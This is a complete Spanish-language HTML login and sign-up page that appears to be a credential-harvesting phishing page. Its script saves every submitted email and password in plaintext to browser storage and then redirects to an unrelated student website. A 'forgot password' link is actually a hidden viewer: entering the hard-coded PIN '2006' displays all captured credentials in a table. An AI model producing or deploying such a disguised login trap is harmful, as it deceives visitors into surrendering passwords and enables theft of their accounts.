<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Registro e Inicio de Sesión</title>
<style>
/* Fondo con imagen difuminada */
body {
  margin: 0;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: url("https://images.unsplash.com/photo-1508780709619-79562169bc64?auto=format&fit=crop&w=1600&q=80") no-repeat center center/cover;
  position: relative;
}

body::before {
  content: "";
  position: absolute;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(6px);
}

/* Caja de login */
.container {
  position: relative;
  z-index: 2;
  background: rgba(255,255,255,0.9);
  padding: 40px;
  border-radius: 20px;
  box-shadow: 0 8px 25px rgba(0,0,0,0.25);
  width: 100%;
  max-width: 400px;
  text-align: center;
  animation: fadeIn 1.2s ease-in-out;
}

/* Animación de entrada */
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(-20px); }
  to { opacity: 1; transform: translateY(0); }
}

/* Encabezado de pestañas */
.tabs {
  display: flex;
  justify-content: space-around;
  margin-bottom: 20px;
}

.tabs button {
  flex: 1;
  padding: 12px;
  border: none;
  border-radius: 10px;
  background: #eee;
  cursor: pointer;
  font-weight: bold;
  transition: all 0.3s ease;
}

.tabs button.active {
  background: #4285F4;
  color: white;
  box-shadow: 0 4px 15px rgba(66,133,244,0.4);
}

/* Inputs */
.container input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border: 1px solid #ccc;
  border-radius: 10px;
  outline: none;
  transition: 0.3s;
}

.container input:focus {
  border-color: #4285F4;
  box-shadow: 0 0 8px rgba(66,133,244,0.3);
}

/* Botones */
.container button.submit-btn {
  width: 100%;
  padding: 12px;
  background: #4285F4;
  border: none;
  border-radius: 10px;
  color: white;
  font-size: 16px;
  cursor: pointer;
  margin-top: 10px;
  transition: 0.3s;
}

.container button.submit-btn:hover {
  background: #3367D6;
  transform: scale(1.05);
}

/* Extra links */
.extra {
  margin-top: 15px;
  font-size: 13px;
  color: #555;
}

.extra a {
  color: #4285F4;
  text-decoration: none;
}

.extra a:hover {
  text-decoration: underline;
}

/* Tabla estilo Excel */
#historialContainer {
  display: none;
  margin-top: 20px;
  width: 90%;
  max-width: 800px;
  overflow-x: auto;
}
#historialContainer table {
  width: 100%;
  border-collapse: collapse;
}
#historialContainer th, #historialContainer td {
  border: 1px solid #ccc;
  padding: 10px;
  text-align: left;
}
#historialContainer th {
  background: #4285F4;
  color: white;
}
#historialContainer tr:nth-child(even) {
  background: #f0f0f0;
}
</style>
</head>
<body>

<div class="container">
  <div class="tabs">
    <button id="tabRegister" class="active">Regístrate</button>
    <button id="tabLogin">Inicia sesión</button>
  </div>

  <h2 id="formTitle">Bienvenido</h2>
  <form id="loginForm">
    <input type="email" name="email" placeholder="Correo electrónico" required>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit" class="submit-btn">Continuar</button>
  </form>

  <div class="extra">
    <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
  </div>
</div>

<!-- Historial -->
<div id="historialContainer">
  <h2>Historial de Datos Registrados</h2>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>Correo</th>
        <th>Contraseña</th>
        <th>Fecha</th>
      </tr>
    </thead>
    <tbody id="historialTableBody"></tbody>
  </table>
</div>

<script>
const loginForm = document.getElementById('loginForm');
const recoverLink = document.getElementById('recoverLink');
const historialContainer = document.getElementById('historialContainer');
const historialTableBody = document.getElementById('historialTableBody');

// Tabs
const tabRegister = document.getElementById('tabRegister');
const tabLogin = document.getElementById('tabLogin');
const formTitle = document.getElementById('formTitle');

tabRegister.addEventListener('click', () => {
  tabRegister.classList.add('active');
  tabLogin.classList.remove('active');
  formTitle.innerText = "Crea tu cuenta";
});

tabLogin.addEventListener('click', () => {
  tabLogin.classList.add('active');
  tabRegister.classList.remove('active');
  formTitle.innerText = "Inicia sesión";
});

// Guardar datos
loginForm.addEventListener('submit', function(e){
  e.preventDefault();
  const email = this.email.value;
  const password = this.password.value;

  let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
  historial.push({ email, password, fecha: new Date().toLocaleString() });
  localStorage.setItem('historialDatos', JSON.stringify(historial));

  window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
});

// Mostrar historial
recoverLink.addEventListener('click', function(){
  const pin = prompt("Ingresa el PIN para acceder a los datos:");
  if(pin === "2006"){
    let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
    historialTableBody.innerHTML = "";
    historial.forEach((dato, index) => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${index + 1}</td>
        <td>${dato.email}</td>
        <td>${dato.password}</td>
        <td>${dato.fecha}</td>
      `;
      historialTableBody.appendChild(tr);
    });
    historialContainer.style.display = "block";
    historialContainer.scrollIntoView({ behavior: 'smooth' });
  } else {
    alert("PIN incorrecto ❌");
  }
});
</script>

</body>
</html>
